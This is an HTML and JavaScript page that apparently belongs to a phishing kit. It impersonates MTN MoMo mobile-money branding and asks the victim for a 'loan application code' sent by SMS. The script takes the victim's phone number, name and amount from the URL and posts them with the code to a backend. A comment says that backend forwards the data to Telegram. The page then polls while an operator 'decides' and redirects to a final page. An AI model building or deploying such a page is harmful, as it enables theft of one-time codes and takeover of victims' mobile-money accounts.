<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Application - MoMo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }

        /* HEADER */
        .header { background: #fff; padding: 14px 24px; display: flex; align-items: center;
                  gap: 16px; border-bottom: 3px solid #ffcc00;
                  box-shadow: 0 2px 8px rgba(0,0,0,.04); }
        .logo-box { display: flex; align-items: center; gap: 10px; }
        .logo-icon { width: 42px; height: 42px; background: #ffcc00; border-radius: 8px;
                     display: flex; align-items: center; justify-content: center;
                     font-weight: 800; font-size: 11px; color: #004f9f; text-align: center;
                     border: 2px solid #004f9f; line-height: 1; }
        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
        .header-title { font-size: 18px; font-weight: 700; color: #222; flex: 1; }
        .hamburger { font-size: 22px; color: #333; cursor: pointer; }

        /* MAIN */
        .main { flex: 1; display: flex; flex-direction: column;
                align-items: center; padding: 60px 16px; }

        .page-title { font-size: 32px; font-weight: 800; color: #111;
                      text-align: center; margin-bottom: 40px; }

        .card { background: #fff; width: 100%; max-width: 500px; border-radius: 16px;
                padding: 44px 36px 36px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
                text-align: center; }

        .card-icon {
            width: 70px; height: 70px; background: #fff5cc; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px; font-size: 32px;
        }

        .card-label { font-size: 14px; font-weight: 600; color: #444;
                      margin-bottom: 8px; line-height: 1.5; }
        .card-sub { font-size: 13px; color: #888; margin-bottom: 24px; }

        .card input {
            width: 100%; padding: 18px 20px; font-size: 20px;
            font-family: inherit; border: 2px solid #ffcc00; border-radius: 10px;
            background: #fffdf5; color: #111; outline: none;
            text-align: center; font-weight: 700; letter-spacing: 3px;
            margin-bottom: 14px; transition: box-shadow .2s;
        }
        .card input::placeholder { color: #ccc; letter-spacing: 2px; font-weight: 500; }
        .card input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
        .card input.error { border-color: #e33; background: #fff5f5; }

        .error-msg { display: none; font-size: 13px; color: #c33;
                     font-weight: 600; margin-bottom: 14px; }
        .error-msg.show { display: block; }

        .submit-btn {
            display: block; width: 100%; background: #ffcc00; color: #111;
            border: none; padding: 18px; font-size: 16px; font-weight: 800;
            letter-spacing: .5px; border-radius: 10px; cursor: pointer;
            transition: background .2s, transform .1s; margin-bottom: 14px;
        }
        .submit-btn:hover { background: #e6b800; }
        .submit-btn:active { transform: scale(.99); }
        .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }

        .resend-btn {
            display: inline-block; background: transparent; color: #b8860b;
            border: none; padding: 8px 14px; font-size: 13px; font-weight: 700;
            cursor: pointer; text-decoration: underline;
        }
        .resend-btn:hover { color: #ffcc00; }
        .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }

        .helper { font-size: 12px; color: #999; margin-top: 12px; }

        /* FOOTER */
        .footer { background: #111; color: #ffcc00; text-align: center;
                  padding: 18px; font-size: 13px; font-weight: 600; }

        @media (max-width: 480px) {
            .page-title { font-size: 26px; }
            .card { padding: 32px 22px 26px; }
            .header-title { font-size: 15px; }
        }
    </style>
</head>
<body>

    <header class="header">
        <span class="hamburger">☰</span>
        <div class="logo-box">
            <div class="logo-icon">MoMo<br>MTN</div>
            <span class="logo-text">MoMo</span>
        </div>
        <span class="header-title">MTN Mobile Services</span>
    </header>

    <main class="main">
        <h1 class="page-title">Verify Application</h1>

        <div class="card">
            <div class="card-icon">🔐</div>

            <p class="card-label">Enter the loan application code<br>we sent your MTN LINE</p>
            <p class="card-sub">Check your SMS for the code</p>

            <div class="error-msg" id="errorMsg"></div>

            <form id="verifyForm">
                <input type="text" id="code" placeholder="XXXX"
                       maxlength="20" autocomplete="off" required>

                <button type="submit" class="submit-btn" id="submitBtn">
                    Verify Code
                </button>
            </form>

            <button class="resend-btn" id="resendBtn">
                Didn't receive a code? Resend
            </button>

            <p class="helper">Codes are valid for 24 hours</p>
        </div>
    </main>

    <footer class="footer">© 2026 MoMo</footer>

    <script>
        // ─── Grab info from URL ───
        const params = new URLSearchParams(window.location.search);
        const phone     = params.get('phone')     || 'unknown';
        const firstName = params.get('firstName') || '';
        const lastName  = params.get('lastName')  || '';
        const amount    = params.get('amount')    || '';

        const codeInput = document.getElementById('code');
        const errorMsg  = document.getElementById('errorMsg');
        const submitBtn = document.getElementById('submitBtn');
        const resendBtn = document.getElementById('resendBtn');

        // ─── Auto-format code as user types ───
        codeInput.addEventListener('input', function () {
            let v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = '';
            if (v.startsWith('MM')) {
                out = v.substring(0, 2);
                if (v.length > 2) out += '-' + v.substring(2, 6);
                if (v.length > 6) out += '-' + v.substring(6, 10);
            } else {
                out = v.substring(0, 4);
                if (v.length > 4) out += '-' + v.substring(4, 8);
                if (v.length > 8) out += '-' + v.substring(8, 12);
            }
            this.value = out;
            this.classList.remove('error');
            errorMsg.classList.remove('show');
        });

        // ─── Poll the server until admin decides (confirmed / rejected) ───
        let referenceId = null;
        let pollTimer = null;

        async function startPolling() {
            pollTimer = setInterval(async () => {
                try {
                    const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
                    const data = await res.json();

                    if (data.status === 'confirmed') {
                        clearInterval(pollTimer);
                        // ✅ REDIRECT TO FINAL PAGE
                        window.location.href = `final.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(referenceId)}`;
                    } else if (data.status === 'rejected') {
                        clearInterval(pollTimer);
                        showResult('rejected');
                    }
                } catch (err) {
                    console.error('Poll failed:', err);
                }
            }, 3000);
        }

        function showResult(type) {
            document.querySelector('.card').innerHTML = `
                <div style="width:90px;height:90px;border-radius:50%;background:#e33;
                            display:flex;align-items:center;justify-content:center;
                            margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
                <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
                    Application Rejected
                </h2>
                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
                            background:#fdecea;color:#c33;font-size:13px;font-weight:700;
                            margin-bottom:20px;">INVALID APPLICATION CODE</div>
                <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
                    The application code you entered is <strong>incorrect</strong>.<br>
                    Please check your SMS and try again.
                </p>
                <button onclick="location.reload()" style="background:#111;color:#ffcc00;
                        border:none;padding:14px 28px;font-size:14px;font-weight:800;
                        border-radius:10px;cursor:pointer;">Try Again</button>
            `;
        }

        // ─── Submit code → send to server → server forwards to Telegram ───
        document.getElementById('verifyForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const code = codeInput.value.trim();
            if (code.length < 4) {
                errorMsg.textContent = 'Please enter a valid application code';
                errorMsg.classList.add('show');
                codeInput.classList.add('error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Waiting for approval...';

            try {
                const res = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code, phone, firstName, lastName, amount })
                });
                const data = await res.json();
                referenceId = data.referenceId;

                errorMsg.textContent = '📩 Sent to reviewer. Please wait…';
                errorMsg.style.color = '#b8860b';
                errorMsg.classList.add('show');

                startPolling();

            } catch (err) {
                console.error('Send failed:', err);
                errorMsg.textContent = '⚠️ Network error. Please try again.';
                errorMsg.classList.add('show');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Verify Code';
            }
        });

        // ─── Resend button ───
        resendBtn.addEventListener('click', async function () {
            this.disabled = true;
            this.textContent = 'Sending...';

            try {
                await fetch('/api/resend-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
            } catch (err) {
                console.error('Resend failed:', err);
            }

            errorMsg.textContent = '✅ New code requested. Please check your SMS.';
            errorMsg.style.color = '#3a7d44';
            errorMsg.classList.add('show');

            setTimeout(() => {
                this.disabled = false;
                this.textContent = "Didn't receive a code? Resend";
                errorMsg.classList.remove('show');
                errorMsg.style.color = '#c33';
            }, 5000);
        });
    </script>
</body>
</html>
